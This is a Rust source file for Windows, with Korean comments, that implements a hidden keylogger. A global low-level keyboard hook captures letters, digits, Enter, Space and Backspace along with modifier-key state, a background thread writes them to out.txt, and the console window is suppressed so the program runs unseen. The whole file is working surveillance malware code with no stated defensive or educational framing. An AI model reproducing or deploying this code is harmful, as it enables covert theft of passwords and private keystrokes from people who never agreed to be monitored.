#![windows_subsystem = "windows"]

mod buffer;

use windows::Win32::{
    Foundation::{BOOL, HINSTANCE, HWND, LPARAM, LRESULT, WPARAM},
    UI::{
        Input::KeyboardAndMouse::GetAsyncKeyState,
        WindowsAndMessaging::{
            CallNextHookEx, DispatchMessageA, GetMessageA, SetWindowsHookExW, TranslateMessage,
            UnhookWindowsHookEx, HC_ACTION, HOOKPROC, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL,
        },
    },
};

unsafe extern "system" fn callback_keyboard(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    'brace: {
        if code == HC_ACTION.try_into().unwrap() {
            // 키보드를 눌렀을 때의 입력이면

            /* 키보드 입력 타입으로 변환 */
            let data = std::mem::transmute::<_, &KBDLLHOOKSTRUCT>(lparam);
            // 가상 키코드 (https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes)
            let keycode = data.vkCode;
            // 엔커나 0~9 A~Z가 아니면 종료
            if keycode == 0x08
                || keycode == 0x0D
                || keycode == 0x20
                || (0x30 <= keycode && keycode <= 0x5A)
            {
            } else {
                break 'brace;
            }

            // 키보드를 방금 누른상태, 즉 이전에 안눌려있었으며 지금 눌려있는 상태면 진행, 아니면 종료 (0x8000)
            // 앞의 1비트가 현재 눌려있는지, 뒤의 1비트가 이전에 눌려있었는지. (1이 true)
            let keystate = GetAsyncKeyState(keycode.try_into().unwrap());
            if keystate.leading_zeros() == 0 && keystate.trailing_ones() == 0 {
            } else {
                break 'brace;
            }

            // 키보드 파싱
            let log: buffer::Input;

            if keycode == 0x08 {
                log = buffer::Input::Backspace;
            } else if keycode == 0x0D {
                log = buffer::Input::Enter;
            } else if keycode == 0x20 {
                log = buffer::Input::Space;
            } else {
                let alt = GetAsyncKeyState(0x12).leading_zeros() == 0;
                let ctrl = GetAsyncKeyState(0x11).leading_zeros() == 0;
                let shift = GetAsyncKeyState(0x10).leading_zeros() == 0;
                log = buffer::Input::Keyboard {
                    keycord: keycode,
                    alt,
                    ctrl,
                    shift,
                };
            }

            buffer::BUF.push_back(log);
        }
    }

    CallNextHookEx(None, code, wparam, lparam)
}

const CALLBACK_KEYBOARD: HOOKPROC = Some(callback_keyboard);

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let handle;
    unsafe {
        buffer::OUTPATH = Some(std::env::current_dir()?.join("out.txt"));
        let _ = std::thread::spawn(|| buffer::write_to_file());

        handle = SetWindowsHookExW(WH_KEYBOARD_LL, CALLBACK_KEYBOARD, HINSTANCE::default(), 0)?;

        let mut msg = MSG::default();
        while GetMessageA(&mut msg, HWND(0), 0, 0) == BOOL(1) {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }

        UnhookWindowsHookEx(handle);
    }
    Ok(())
}
